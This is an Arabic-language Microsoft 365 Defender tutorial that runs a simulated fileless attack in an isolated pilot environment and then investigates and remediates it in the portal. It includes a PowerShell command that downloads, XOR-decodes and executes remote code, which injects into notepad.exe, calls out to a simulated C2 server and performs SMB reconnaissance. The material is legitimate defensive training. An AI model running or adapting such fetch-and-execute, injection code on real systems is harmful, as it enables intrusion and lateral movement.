---
title: تشغيل محاكاة الهجوم في بيئة تجريبية Microsoft 365 Defender
description: قم بتشغيل عمليات محاكاة الهجوم Microsoft 365 Defender لمعرفة كيفية تقديم التنبيهات والحوادث، واكتساب الرؤى، ومعالجة التهديدات بسرعة.
search.product: eADQiWindows 10XVcnh
search.appverid: met150
ms.prod: m365-security
ms.mktglfcycl: deploy
ms.sitesec: library
ms.pagetype: security
f1.keywords:
- NOCSH
ms.author: dansimp
author: dansimp
ms.date: 07/09/2021
ms.localizationpriority: medium
manager: dansimp
audience: ITPro
ms.collection:
- M365-security-compliance
- m365solution-scenario
- m365solution-pilotmtpproject
- zerotrust-solution
ms.custom: admindeeplinkDEFENDER
ms.topic: conceptual
ms.technology: m365d
ms.openlocfilehash: 2fd9dc7e8d597890e8d07ce783938bc1d69b6c78
ms.sourcegitcommit: 61b22df76e0f81e5ef11c587b129287886151c79
ms.translationtype: MT
ms.contentlocale: ar-SA
ms.lasthandoff: 07/12/2022
ms.locfileid: "66748748"
---
# <a name="run-an-attack-simulation-in-a-microsoft-365-defender-pilot-environment"></a>تشغيل محاكاة الهجوم في بيئة تجريبية Microsoft 365 Defender


هذه المقالة هي [الخطوة 1 من 2](eval-defender-investigate-respond.md) في عملية إجراء تحقيق والاستجابة لحادث في Microsoft 365 Defender باستخدام بيئة تجريبية. لمزيد من المعلومات حول هذه العملية، راجع مقالة [النظرة العامة](eval-defender-investigate-respond.md) .

بعد إعداد [بيئة الإصدار التجريبي](eval-defender-investigate-respond.md)، حان الوقت لاختبار الاستجابة للحوادث في Microsoft 365 Defender وقدرات التحقيق والمعالجة التلقائية من خلال إنشاء حادث مع هجوم محاكاة واستخدام مدخل Microsoft 365 Defender للتحقيق والاستجابة.

الحادث في Microsoft 365 Defender هو مجموعة من التنبيهات المرتبطة والبيانات المرتبطة التي تشكل قصة الهجوم.

تنشئ خدمات وتطبيقات Microsoft 365 تنبيهات عندما تكتشف حدثا أو نشاطا مريبا أو ضارا. توفر التنبيهات الفردية أدلة قيمة حول هجوم مكتمل أو مستمر. ومع ذلك، تستخدم الهجمات عادة تقنيات مختلفة ضد أنواع مختلفة من الكيانات، مثل الأجهزة والمستخدمين وعلب البريد. والنتيجة هي تنبيهات متعددة لكيانات متعددة في المستأجر الخاص بك.

>[!Note]
>إذا كنت تستخدم تحليل الأمان والاستجابة للحوادث للمرة الأولى، فراجع [معاينة الاستجابة للحوادث الأولى](first-incident-overview.md) للحصول على جولة إرشادية لعملية نموذجية للتحليل والمعالجة ومراجعة ما بعد الحدث.
>

## <a name="simulate-attacks-with-the-microsoft-365-defender-portal"></a>محاكاة الهجمات باستخدام مدخل Microsoft 365 Defender

يحتوي مدخل Microsoft 365 Defender على قدرات مضمنة لإنشاء هجمات محاكاة على بيئة الإصدار التجريبي الخاصة بك:

- تدريب محاكاة الهجوم Microsoft 365 Defender Office 365 في [https://security.microsoft.com/attacksimulator](https://security.microsoft.com/attacksimulator).
  
  في مدخل Microsoft 365 Defender، حدد **"Email & collaboration > Attack simulation training**".

- البرامج التعليمية للهجوم & المحاكاة Microsoft 365 Defender لنقطة النهاية في [https://security.microsoft.com/tutorials/simulations](https://security.microsoft.com/tutorials/simulations).

  في <a href="https://go.microsoft.com/fwlink/p/?linkid=2077139" target="_blank">مدخل Microsoft 365 Defender</a>، حدد **نقاط النهاية > البرامج التعليمية & المحاكاة**.

### <a name="defender-for-office-365-attack-simulation-training"></a>تدريب محاكاة Defender لـ Office 365 الهجوم

تتضمن Defender لـ Office 365 مع Microsoft 365 E5 أو خطة Microsoft Defender لـ Office 365 2 تدريب محاكاة الهجوم لهجمات التصيد الاحتيالي. الخطوات الأساسية هي:

1. إنشاء محاكاة

   للحصول على إرشادات خطوة بخطوة حول كيفية إنشاء محاكاة جديدة وبدء تشغيلها، راجع [محاكاة هجوم التصيد الاحتيالي](/microsoft-365/security/office-365-security/attack-simulation-training).

2. إنشاء حمولة

   للحصول على إرشادات خطوة بخطوة حول كيفية إنشاء حمولة للاستخدام داخل محاكاة، راجع [إنشاء حمولة مخصصة للتدريب على محاكاة الهجوم](/microsoft-365/security/office-365-security/attack-simulation-training-payloads).

3. اكتساب رؤى

   للحصول على إرشادات خطوة بخطوة حول كيفية الحصول على رؤى مع إعداد التقارير، راجع [اكتساب رؤى من خلال التدريب على محاكاة الهجوم](/microsoft-365/security/office-365-security/attack-simulation-training-insights).

   > [!VIDEO https://www.microsoft.com/videoplayer/embed/RWMhvB]

لمزيد من المعلومات، راجع [المحاكاة](/microsoft-365/security/office-365-security/attack-simulation-training-get-started#simulations).

### <a name="defender-for-endpoint-attack-tutorials--simulations"></a>برامج تعليمية حول هجوم Defender لنقطة النهاية & عمليات المحاكاة

فيما يلي محاكاة Defender لنقطة النهاية من Microsoft:

- القائمة الخلفية لإفلات المستند
- التحقيق التلقائي (المرجع الخلفي)

هناك عمليات محاكاة إضافية من مصادر تابعة لجهة خارجية. هناك أيضا مجموعة من البرامج التعليمية.

لكل محاكاة أو برنامج تعليمي:

1. قم بتنزيل مستند التنقل المطابق المتوفر وقراءته.

2. قم بتنزيل ملف المحاكاة. يمكنك اختيار تنزيل الملف أو البرنامج النصي على جهاز الاختبار ولكنه ليس إلزاميا.

3. قم بتشغيل ملف المحاكاة أو البرنامج النصي على جهاز الاختبار كما هو مرشاد في مستند التنقل.

 لمزيد من المعلومات، راجع [Experience Microsoft Defender لنقطة النهاية من خلال محاكاة الهجوم](/microsoft-365/security/defender-endpoint/attack-simulations).

## <a name="simulate-an-attack-with-an-isolated-domain-controller-and-client-device-optional"></a>محاكاة هجوم باستخدام وحدة تحكم مجال معزولة وجهاز عميل (اختياري)

في تمرين الاستجابة للحوادث الاختياري هذا، ستقوم بمحاكاة هجوم على وحدة تحكم مجال خدمات مجال Active Directory معزولة (AD DS) وجهاز Windows باستخدام برنامج نصي PowerShell ثم التحقيق في الحادث وإصلاحه وحله.

أولا، تحتاج إلى إضافة نقاط النهاية إلى بيئة الإصدار التجريبي.

### <a name="add-pilot-environment-endpoints"></a>إضافة نقاط نهاية بيئة تجريبية

أولا، تحتاج إلى إضافة وحدة تحكم مجال AD DS معزولة وجهاز Windows إلى بيئة الإصدار التجريبي.

1. تحقق من تمكين مستأجر بيئة الإصدار التجريبي [Microsoft 365 Defender](m365d-enable.md#confirm-that-the-service-is-on).

2. تحقق من أن وحدة التحكم بالمجال:

   - تشغيل Windows Server 2008 R2 أو إصدار أحدث.
   - تقارير [Microsoft Defender for Identity](/azure/security-center/security-center-wdatp) وقد مكنت [الإدارة عن بعد](/windows-server/administration/server-manager/configure-remote-management-in-server-manager).
   - تم تمكين [تكامل Microsoft Defender for Identity Microsoft Defender for Cloud Apps](/cloud-app-security/mdi-integration).
   - لديه مستخدم اختبار يتم إنشاؤه في مجال الاختبار. الأذونات على مستوى المسؤول غير مطلوبة.

3. تحقق من أن جهاز الاختبار الخاص بك:

   - تشغيل Windows 10 الإصدار 1903 أو إصدار أحدث.
   - انضم إلى مجال وحدة تحكم مجال AD DS.
   - تم تمكين [برنامج الحماية من الفيروسات لـ Windows Defender](/windows/security/threat-protection/windows-defender-antivirus/configure-windows-defender-antivirus-features). إذا كنت تواجه مشكلة في تمكين برنامج الحماية من الفيروسات لـ Windows Defender، فراجع [هذا الموضوع لاستكشاف الأخطاء وإصلاحها](/windows/security/threat-protection/microsoft-defender-atp/troubleshoot-onboarding#ensure-that-microsoft-defender-antivirus-is-not-disabled-by-a-policy).
   - تم [إلحاقه Microsoft Defender لنقطة النهاية](/windows/security/threat-protection/microsoft-defender-atp/configure-endpoints).

إذا كنت تستخدم مجموعات المستأجر والأجهزة، فتنشئ مجموعة أجهزة مخصصة لجهاز الاختبار وتدفعها إلى المستوى الأعلى.

أحد البدائل هو استضافة وحدة تحكم مجال AD DS وجهاز الاختبار كأجهزة ظاهرية في خدمات البنية الأساسية ل Microsoft Azure. يمكنك استخدام الإرشادات في [المرحلة 1 من دليل مختبر اختبار المؤسسة المحاكي](/microsoft-365/enterprise/simulated-ent-base-configuration-microsoft-365-enterprise#phase-1-create-a-simulated-intranet)، ولكن تخطي إنشاء الجهاز الظاهري APP1.

فيما يلي النتيجة.

:::image type="content" source="../../media/eval-defender-investigate-respond/eval-defender-eval-investigate-respond-endpoints-tlg.png" alt-text="بيئة التقييم باستخدام دليل مختبر اختبار المؤسسة المحاكي" lightbox="../../media/eval-defender-investigate-respond/eval-defender-eval-investigate-respond-endpoints-tlg.png":::

ستقوم بمحاكاة هجوم متطور يستفيد من التقنيات المتقدمة للاختراق من الكشف. يقوم الهجوم بتعداد جلسات Server Message Block (SMB) المفتوحة على وحدات التحكم بالمجال ويسترد عناوين IP الأخيرة لأجهزة المستخدمين. عادة لا تتضمن هذه الفئة من الهجمات الملفات التي تم إسقاطها على جهاز المجني عليه وتحدث فقط في الذاكرة. إنهم "يعيشون خارج الأرض" باستخدام النظام الحالي والأدوات الإدارية وإدخال التعليمات البرمجية الخاصة بهم في عمليات النظام لإخفاء تنفيذها. يسمح لهم هذا السلوك بالكشف والثبات على الجهاز.

في هذه المحاكاة، يبدأ نموذج السيناريو الخاص بنا مع برنامج نصي PowerShell. في العالم الحقيقي، قد يتم خداع المستخدم لتشغيل برنامج نصي أو قد يتم تشغيل البرنامج النصي من اتصال عن بعد بجهاز كمبيوتر آخر من جهاز مصاب مسبقا، ما يشير إلى أن المهاجم يحاول الانتقال لاحقا في الشبكة. يمكن أن يكون الكشف عن هذه البرامج النصية صعبا لأن المسؤولين غالبا ما يقومون بتشغيل البرامج النصية عن بعد لتنفيذ أنشطة إدارية مختلفة.

:::image type="content" source="../../media/mtp/mtpdiydiagram.png" alt-text="هجوم Fileless PowerShell مع حقن العملية وهجوم إعادة بناء SMB" lightbox="../../media/mtp/mtpdiydiagram.png":::

أثناء المحاكاة، يدخل الهجوم shellcode في عملية تبدو وكأنها بريء. يتطلب السيناريو استخدام notepad.exe. اخترنا هذه العملية للمحاكاة، ولكن من المرجح أن يستهدف المهاجمون عملية نظام طويلة الأمد، مثل svchost.exe. ثم ينتقل shellcode للاتصال بخادم الأوامر والتحكم للمهاجم (C2) لتلقي إرشادات حول كيفية المتابعة. يحاول البرنامج النصي تنفيذ استعلامات الاستطلاع مقابل وحدة التحكم بالمجال (DC). يسمح الاستطلاع للمهاجم بالحصول على معلومات حول معلومات تسجيل دخول المستخدم الأخيرة. بمجرد حصول المهاجمين على هذه المعلومات، يمكنهم الانتقال لاحقا في الشبكة للوصول إلى حساب حساس معين

> [!IMPORTANT]
> للحصول على أفضل النتائج، اتبع تعليمات محاكاة الهجوم عن كثب قدر الإمكان.

### <a name="run-the-isolated-ad-ds-domain-controller-attack-simulation"></a>تشغيل محاكاة هجوم وحدة تحكم مجال AD DS المعزولة

لتشغيل محاكاة سيناريو الهجوم:

1. تأكد من أن بيئة الإصدار التجريبي تتضمن وحدة تحكم مجال AD DS المعزولة وجهاز Windows.

2. سجل الدخول إلى جهاز الاختبار باستخدام حساب مستخدم الاختبار.

3. افتح نافذة Windows PowerShell على جهاز الاختبار.

4. انسخ البرنامج النصي للمحاكاة التالي:

   ```powershell
   [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12;$xor
   = [System.Text.Encoding]::UTF8.GetBytes('WinATP-Intro-Injection');$base64String = (Invoke-WebRequest -URI "https://winatpmanagement.windows.com/client/management/static/MTP_Fileless_Recon.txt"
   -UseBasicParsing).Content;Try{ $contentBytes = [System.Convert]::FromBase64String($base64String) } Catch { $contentBytes = [System.Convert]::FromBase64String($base64String.Substring(3)) };$i = 0;
   $decryptedBytes = @();$contentBytes.foreach{ $decryptedBytes += $_ -bxor $xor[$i];
   $i++; if ($i -eq $xor.Length) {$i = 0} };Invoke-Expression ([System.Text.Encoding]::UTF8.GetString($decryptedBytes))
   ```

   > [!NOTE]
   > إذا فتحت هذه المقالة على مستعرض ويب، فقد تواجه مشاكل في نسخ النص الكامل دون فقدان أحرف معينة أو إدخال فواصل أسطر إضافية. إذا كان الأمر كذلك، فقم بتنزيل هذا المستند وفتحه على Adobe Reader.

5. قم بلصق البرنامج النصي المنسوخ وتشغيله في نافذة PowerShell.

> [!NOTE]
> إذا كنت تقوم بتشغيل PowerShell باستخدام بروتوكول سطح المكتب البعيد (RDP)، فاستخدم الأمر "نص حافظة النوع" في عميل RDP لأن أسلوب **CTRL-V** hotkey أو أسلوب النقر بزر الماوس الأيمن قد لا يعمل. في بعض الأحيان لن تقبل الإصدارات الأخيرة من PowerShell هذا الأسلوب، فقد تحتاج إلى النسخ إلى المفكرة في الذاكرة أولا، ونسخها في الجهاز الظاهري، ثم لصقها في PowerShell.

بعد بضع ثوان، سيتم فتح تطبيق المفكرة. سيتم إدخال رمز هجوم محاكاة في المفكرة. اجعل مثيل المفكرة الذي تم إنشاؤه تلقائيا مفتوحا لتجربة السيناريو الكامل.

سيحاول رمز الهجوم المحاكي الاتصال بعنوان IP خارجي (محاكاة خادم C2) ثم محاولة إجراء استطلاع ضد وحدة التحكم بالمجال من خلال SMB.

سترى هذه الرسالة معروضة على وحدة تحكم PowerShell عند اكتمال هذا البرنامج النصي:

```console
ran NetSessionEnum against [DC Name] with return code result 0
```

للاطلاع على ميزة الحدث والاستجابة التلقائية قيد التنفيذ، احتفظ بعملية notepad.exe مفتوحة. سترى الحدث التلقائي والاستجابة يوقفان عملية المفكرة.

### <a name="investigate-the-incident-for-the-simulated-attack"></a>التحقيق في الحادث للهجوم المحاكي

> [!NOTE]
> قبل أن نرشدك خلال هذه المحاكاة، شاهد الفيديو التالي لمعرفة كيف تساعدك إدارة الحوادث على تجميع التنبيهات ذات الصلة معا كجزء من عملية التحقيق، حيث يمكنك العثور عليها في المدخل، وكيف يمكن أن تساعدك في عمليات الأمان الخاصة بك:

> [!VIDEO https://www.microsoft.com/videoplayer/embed/RE4Bzwz?]

بالتبديل إلى وجهة نظر محلل SOC، يمكنك الآن البدء في التحقيق في الهجوم في مدخل Microsoft 365 Defender.

1. افتح مدخل <a href="https://go.microsoft.com/fwlink/p/?linkid=2077139" target="_blank">Microsoft 365 Defender</a>.

2. من جزء التنقل، حدد **Incidents & Alerts > Incidents**.

3. سيظهر الحدث الجديد للهجوم المحاكي في قائمة انتظار الحدث.

   :::image type="content" source="../../media/mtp/fig2.png" alt-text="مثال على قائمة انتظار الحوادث" lightbox="../../media/mtp/fig2.png":::

#### <a name="investigate-the-attack-as-a-single-incident"></a>التحقيق في الهجوم كحادث واحد

Microsoft 365 Defender ربط التحليلات وتجميع جميع التنبيهات والتحقيقات ذات الصلة من منتجات مختلفة في كيان حادث واحد. من خلال القيام بذلك، Microsoft 365 Defender تظهر قصة هجوم أوسع، ما يسمح لمحلل SOC بفهم التهديدات المعقدة والاستجابة لها.

ترتبط التنبيهات التي تم إنشاؤها أثناء هذه المحاكاة بنفس التهديد، ونتيجة لذلك، يتم تجميعها تلقائيا كحادث واحد.

لعرض الحدث:

1. افتح مدخل <a href="https://go.microsoft.com/fwlink/p/?linkid=2077139" target="_blank">Microsoft 365 Defender</a>.

2. من جزء التنقل، حدد **Incidents & Alerts > Incidents**.

3. حدد العنصر الأحدث بالنقر فوق الدائرة الموجودة على يسار اسم الحدث. تعرض اللوحة الجانبية معلومات إضافية حول الحادث، بما في ذلك جميع التنبيهات ذات الصلة. لكل حادث اسم فريد يصفه استنادا إلى سمات التنبيهات التي يتضمنها.

   يمكن تصفية التنبيهات التي تظهر في لوحة المعلومات استنادا إلى موارد الخدمة: Microsoft Defender for Identity، Microsoft Defender for Cloud Apps، Microsoft Defender لنقطة النهاية، Microsoft 365 Defender، Microsoft Defender لـ Office 365.

3. حدد **صفحة "فتح الحدث** " للحصول على مزيد من المعلومات حول الحدث.

   في صفحة **الحدث** ، يمكنك مشاهدة جميع التنبيهات والمعلومات المتعلقة بالحادث. تتضمن المعلومات الكيانات والأصول المشاركة في التنبيه، ومصدر الكشف عن التنبيهات (مثل Microsoft Defender for Identity أو Microsoft Defender لنقطة النهاية)، وسبب ربطها معا. تظهر مراجعة قائمة تنبيهات الحوادث تقدم الهجوم. من طريقة العرض هذه، يمكنك رؤية التنبيهات الفردية والتحقيق فيها.

   يمكنك أيضا النقر فوق **"إدارة الحدث** " من القائمة اليسرى، لوضع علامة على الحدث، وتعيينه لنفسك، وإضافة تعليقات.

#### <a name="review-generated-alerts"></a>مراجعة التنبيهات التي تم إنشاؤها

لنلق نظرة على بعض التنبيهات التي تم إنشاؤها أثناء هجوم المحاكاة.

> [!NOTE]
> سنستعرض عددا قليلا فقط من التنبيهات التي تم إنشاؤها أثناء هجوم المحاكاة. استنادا إلى إصدار Windows ومنتجات Microsoft 365 Defender التي تعمل على جهاز الاختبار، قد ترى المزيد من التنبيهات التي تظهر بترتيب مختلف قليلا.

:::image type="content" source="../../media/mtp/fig6.png" alt-text="مثال على تنبيه تم إنشاؤه" lightbox="../../media/mtp/fig6.png":::

##### <a name="alert-suspicious-process-injection-observed-source-microsoft-defender-for-endpoint"></a>تنبيه: تمت ملاحظة حقن العملية المشبوهة (المصدر: Microsoft Defender لنقطة النهاية)

يستخدم المهاجمون المتقدمون أساليب متطورة وخفية للاستمرار في الذاكرة والإخفاء من أدوات الكشف. إحدى التقنيات الشائعة هي العمل من داخل عملية نظام موثوق بها بدلا من تنفيذ ضار، ما يجعل من الصعب على أدوات الكشف وعمليات الأمان اكتشاف التعليمات البرمجية الضارة.

للسماح لمحللي SOC بالتقاط هذه الهجمات المتقدمة، توفر أدوات استشعار الذاكرة العميقة في Microsoft Defender لنقطة النهاية خدمة السحابة لدينا رؤية غير مسبوقة في مجموعة متنوعة من تقنيات حقن التعليمات البرمجية عبر العمليات. يوضح الشكل التالي كيفية الكشف عن Defender لنقطة النهاية وتنبيهه عند محاولة إدخال التعليمات البرمجية <i> إلىnotepad.exe</i>.

:::image type="content" source="../../media/mtp/fig7.png" alt-text="مثال على التنبيه لحقن تعليمات برمجية يحتمل أن تكون ضارة" lightbox="../../media/mtp/fig7.png":::

##### <a name="alert-unexpected-behavior-observed-by-a-process-run-with-no-command-line-arguments-source-microsoft-defender-for-endpoint"></a>تنبيه: سلوك غير متوقع تمت ملاحظته بواسطة عملية تشغيل بدون وسيطات سطر الأوامر (المصدر: Microsoft Defender لنقطة النهاية)

غالبا ما تستهدف عمليات الكشف Microsoft Defender لنقطة النهاية السمة الأكثر شيوعا لأسلوب الهجوم. يضمن هذا الأسلوب القدرة على الصمود ويرفع الشريط للمهاجمين للتبديل إلى التكتيكات الأحدث.

نحن نستخدم خوارزميات التعلم واسعة النطاق لتأسيس السلوك العادي للعمليات الشائعة داخل المؤسسة وفي جميع أنحاء العالم ونراقب متى تظهر هذه العمليات سلوكيات غير طبيعية. غالبا ما تشير هذه السلوكيات الشاذة إلى أنه تم تقديم تعليمات برمجية غريبة ويتم تشغيلها في عملية موثوق بها بخلاف ذلك.

بالنسبة لهذا السيناريو، تظهر <i>notepad.exe</i> العملية سلوكا غير طبيعي، ينطوي على الاتصال بموقع خارجي. هذه النتيجة مستقلة عن الأسلوب المحدد المستخدم لتقديم وتنفيذ التعليمات البرمجية الضارة.

> [!NOTE]
> نظرا لأن هذا التنبيه يستند إلى نماذج التعلم الآلي التي تتطلب معالجة خلفية إضافية، فقد يستغرق الأمر بعض الوقت قبل أن ترى هذا التنبيه في المدخل.

لاحظ أن تفاصيل التنبيه تتضمن عنوان IP الخارجي - مؤشر يمكنك استخدامه كمحور لتوسيع التحقيق.

حدد عنوان IP في شجرة عملية التنبيه لعرض صفحة تفاصيل عنوان IP.

:::image type="content" source="../../media/mtp/fig8.png" alt-text="مثال على السلوك غير المتوقع بواسطة عملية يتم تشغيلها بدون وسيطات سطر الأوامر" lightbox="../../media/mtp/fig8.png":::

يعرض الشكل التالي صفحة تفاصيل عنوان IP المحدد (النقر فوق عنوان IP في شجرة عملية التنبيه).

:::image type="content" source="../../media/mtp/fig9.png" alt-text="مثال على صفحة تفاصيل عنوان IP" lightbox="../../media/mtp/fig9.png":::

##### <a name="alert-user-and-ip-address-reconnaissance-smb-source-microsoft-defender-for-identity"></a>تنبيه: استكشاف عنوان المستخدم وعنوان IP (SMB) (المصدر: Microsoft Defender for Identity)

يتيح التعداد باستخدام بروتوكول Server Message Block (SMB) للمهاجمين الحصول على معلومات تسجيل دخول المستخدم الأخيرة التي تساعدهم على التنقل لاحقا عبر الشبكة للوصول إلى حساب حساس معين.

في هذا الكشف، يتم تشغيل تنبيه عند تشغيل تعداد جلسة SMB مقابل وحدة تحكم المجال.

:::image type="content" source="../../media/mtp/fig10.png" alt-text="مثال على تنبيه Microsoft Defender for Identity للاستطلاع عن عنوان المستخدم وعنوان IP" lightbox="../../media/mtp/fig10.png":::

#### <a name="review-the-device-timeline-with-microsoft-defender-for-endpoint"></a>مراجعة المخطط الزمني للجهاز باستخدام Microsoft Defender لنقطة النهاية

بعد استكشاف التنبيهات المختلفة في هذا الحدث، انتقل مرة أخرى إلى صفحة الحادث التي قمت بالتحقيق فيها سابقا. حدد علامة التبويب **"Devices**" في صفحة الحدث لمراجعة الأجهزة المشاركة في هذا الحدث كما تم الإبلاغ عنها من قبل Microsoft Defender لنقطة النهاية Microsoft Defender for Identity.

حدد اسم الجهاز حيث تم تنفيذ الهجوم، لفتح صفحة الكيان لهذا الجهاز المحدد. في تلك الصفحة، يمكنك مشاهدة التنبيهات التي تم تشغيلها والأحداث ذات الصلة.

حدد علامة التبويب **"الخط الزمني** " لفتح المخطط الزمني للجهاز وعرض جميع الأحداث والسلوكيات التي تمت ملاحظتها على الجهاز بترتيب زمني، يتقاطع مع التنبيهات التي تم رفعها.

:::image type="content" source="../../media/mtp/fig11.png" alt-text="مثال على المخطط الزمني للجهاز مع السلوكيات" lightbox="../../media/mtp/fig11.png":::

يوفر توسيع بعض السلوكيات الأكثر إثارة للاهتمام تفاصيل مفيدة، مثل أشجار المعالجة.

على سبيل المثال، قم بالتمرير لأسفل حتى تجد حدث التنبيه **الذي تمت ملاحظته أثناء عملية حقن مريبة**. حدد **powershell.exe التي تم إدخالها إلى حدث معالجة notepad.exe** أسفله، لعرض شجرة العملية الكاملة لهذا السلوك ضمن الرسم البياني **لكيانات الحدث** في الجزء الجانبي. استخدم شريط البحث للتصفية إذا لزم الأمر.

:::image type="content" source="../../media/mtp/fig12.png" alt-text="مثال على شجرة المعالجة لسلوك إنشاء ملف PowerShell المحدد" lightbox="../../media/mtp/fig12.png":::

#### <a name="review-the-user-information-with-microsoft-defender-for-cloud-apps"></a>مراجعة معلومات المستخدم باستخدام Microsoft Defender for Cloud Apps

في صفحة الحدث، حدد علامة التبويب **"المستخدمون** " لعرض قائمة المستخدمين المشاركين في الهجوم. يحتوي الجدول على معلومات إضافية حول كل مستخدم، بما في ذلك درجة **أولوية التحقيق** لكل مستخدم.

حدد اسم المستخدم لفتح صفحة ملف تعريف المستخدم حيث يمكن إجراء مزيد من التحقيق. [اقرأ المزيد حول التحقيق في المستخدمين المعرضين للمخاطر](/cloud-app-security/tutorial-ueba#identify).

:::image type="content" source="../../media/mtp/fig13.png" alt-text="صفحة مستخدم Defender for Cloud Apps" lightbox="../../media/mtp/fig13.png":::

#### <a name="automated-investigation-and-remediation"></a>التحقيق التلقائي والمعالجة

> [!NOTE]
>قبل أن نرشدك خلال هذه المحاكاة، شاهد الفيديو التالي للتعرف على ما هو الإصلاح الذاتي التلقائي، ومكان العثور عليه في المدخل، وكيف يمكن أن يساعد في عمليات الأمان الخاصة بك:

> [!VIDEO https://www.microsoft.com/en-us/videoplayer/embed/RE4BzwB]

انتقل مرة أخرى إلى الحدث في مدخل Microsoft 365 Defender. تعرض علامة التبويب **"Investigations**" في صفحة **"Incident"** التحقيقات التلقائية التي تم تشغيلها بواسطة Microsoft Defender for Identity Microsoft Defender لنقطة النهاية. تعرض لقطة الشاشة أدناه فقط التحقيق التلقائي الذي يشغله Defender لنقطة النهاية. بشكل افتراضي، يقوم Defender لنقطة النهاية تلقائيا بمعالجة البيانات الاصطناعية الموجودة في قائمة الانتظار، والتي تتطلب المعالجة.

:::image type="content" source="../../media/mtp/fig14.png" alt-text="مثال على التحقيقات التلقائية المتعلقة بالحادث" lightbox="../../media/mtp/fig14.png":::

حدد التنبيه الذي أدى إلى إجراء تحقيق لفتح صفحة **تفاصيل التحقيق** . سترى التفاصيل التالية:

- التنبيه (التنبيهات) التي أدت إلى التحقيق التلقائي.
- المستخدمون والأجهزة المتأثرة. إذا تم العثور على مؤشرات على أجهزة إضافية، فسيتم سرد هذه الأجهزة الإضافية أيضا.
- قائمة الأدلة. تم العثور على الكيانات وتحليلها، مثل الملفات والعمليات والخدمات وبرامج التشغيل وعناوين الشبكة. يتم تحليل هذه الكيانات للحصول على علاقات محتملة بالتنبيه ويتم تصنيفها على أنها ضارة أو ضارة.
- تم العثور على تهديدات. التهديدات المعروفة التي تم العثور عليها أثناء التحقيق.

> [!NOTE]
> اعتمادا على التوقيت، قد لا يزال التحقيق التلقائي قيد التشغيل. انتظر بضع دقائق حتى تكتمل العملية قبل جمع وتحليل الأدلة ومراجعة النتائج. تحديث صفحة **تفاصيل التحقيق** للحصول على أحدث النتائج.

:::image type="content" source="../../media/mtp/fig15.png" alt-text="مثال على صفحة تفاصيل التحقيق" lightbox="../../media/mtp/fig15.png":::

أثناء التحقيق التلقائي، حدد Microsoft Defender لنقطة النهاية عملية notepad.exe، والتي تم إدخالها كأحد البيانات الاصطناعية التي تتطلب المعالجة. يقوم Defender لنقطة النهاية تلقائيا بإيقاف حقن العملية المشبوهة كجزء من المعالجة التلقائية.

يمكنك أن ترى <i>notepad.exe</i> تختفي من قائمة العمليات قيد التشغيل على جهاز الاختبار.

#### <a name="resolve-the-incident"></a>حل الحادث

بعد اكتمال التحقيق وتأكيد معالجتها، يمكنك حل الحادث.

من صفحة **«Incident»** ، حدد **«Manage incident»**. تعيين الحالة إلى **حل الحدث** وتحديد **تنبيه True** للتصنيف واختبار **الأمان** للتحديد.

:::image type="content" source="../../media/mtp/fig16.png" alt-text="مثال على صفحة الأحداث مع لوحة الحدث &quot;إدارة&quot; المفتوحة حيث يمكنك النقر فوق مفتاح التبديل لحل الحادث" lightbox="../../media/mtp/fig16.png":::

عند حل الحدث، فإنه يحل جميع التنبيهات المرتبطة في مدخل Microsoft 365 Defender والمداخل ذات الصلة.

وهذا يختتم عمليات محاكاة الهجوم لتحليل الحوادث والتحقيق التلقائي وحل الحوادث.

## <a name="next-step"></a>الخطوة التالية

[:::image type="content" source="../../media/eval-defender-investigate-respond/eval-defender-eval-investigate-respond-step2.png" alt-text="قدرات الاستجابة للحوادث Microsoft 365 Defender" lightbox="../../media/eval-defender-investigate-respond/eval-defender-eval-investigate-respond-step2.png":::](eval-defender-investigate-respond-additional.md)

الخطوة 2 من 2: [تجربة قدرات الاستجابة للحوادث Microsoft 365 Defender](eval-defender-investigate-respond-additional.md)

### <a name="navigation-you-may-need"></a>التنقل الذي قد تحتاج إليه

[إنشاء بيئة تقييم Microsoft 365 Defender](eval-create-eval-environment.md)
